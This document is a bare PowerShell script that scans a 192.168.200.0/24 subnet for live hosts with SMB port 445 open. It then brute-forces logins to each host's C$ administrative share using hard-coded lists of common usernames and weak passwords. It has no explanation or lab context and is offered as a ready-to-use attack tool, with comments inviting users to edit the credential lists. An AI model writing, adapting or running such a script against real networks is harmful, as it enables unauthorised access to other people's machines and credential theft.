$Subnet = "192.168.200."
$UserList = @("Administrator", "Admin", "User1", "skynet", "zeroday")  # Modify user list
$PasswordList = @("Password123", "Welcome1", "123456", "M@ster123", "zeroday")  # Modify password list

1..254 | ForEach-Object {
    $IP = "$Subnet$_"
    
    if (Test-Connection -ComputerName $IP -Count 1 -Quiet -TimeoutSeconds 2) {
        Write-Output "Host Alive: $IP"

        if (Test-NetConnection -ComputerName $IP -Port 445 -InformationLevel Quiet) {
            Write-Output "SMB Open: $IP - Starting brute force"

            ForEach ($User in $UserList) {
                ForEach ($Password in $PasswordList) {
                    Write-Output "Trying SMB Login: $User / $Password on $IP"
                    
                    $SecPassword = ConvertTo-SecureString $Password -AsPlainText -Force
                    $Cred = New-Object System.Management.Automation.PSCredential ($User, $SecPassword)
                    
                    try {
                        Invoke-Command -ScriptBlock { net use \\$IP\C$ } -Credential $Cred -ErrorAction Stop
                        Write-Output "SMB Login Successful: $User / $Password on $IP"
                        break
                    } catch {
                        Write-Output "SMB Login Failed: $User / $Password on $IP"
                    }
                }
            }
        }
    } else {
        Write-Output "Host Unreachable: $IP (Skipping)"
    }
}
